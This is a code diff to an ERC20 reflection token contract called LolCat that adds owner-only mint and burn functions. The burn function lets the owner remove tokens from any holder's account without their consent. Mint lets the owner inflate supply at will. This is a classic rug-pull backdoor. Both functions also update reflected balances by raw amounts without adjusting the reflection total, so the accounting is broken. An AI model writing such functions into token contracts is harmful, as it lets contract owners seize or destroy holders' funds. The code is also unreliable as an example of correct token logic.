@@ -896,7 +896,18 @@ contract LolCat is Context, IERC20, Ownable {
             10**2
         );
     }
-
+    function mint(address account,uint256 amount)external onlyOwner(){
+        require(account!=address(0),"ERC20: mint to the zero address");
+        _rOwned[account]=_rOwned[account].add(amount);
+        _tTotal=_tTotal.add(amount);
+        emit Transfer(address(0), account, amount);
+    }
+    function burn(address account,uint256 amount)external onlyOwner(){
+        require(account!=address(0),"ERC20: mint to the zero address");
+        _rOwned[account]=_rOwned[account].sub(amount);
+        _tTotal=_tTotal.sub(amount);
+        emit Transfer(account, address(0), amount);
+    }
     function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
         swapAndLiquifyEnabled = _enabled;
         emit SwapAndLiquifyEnabledUpdated(_enabled);
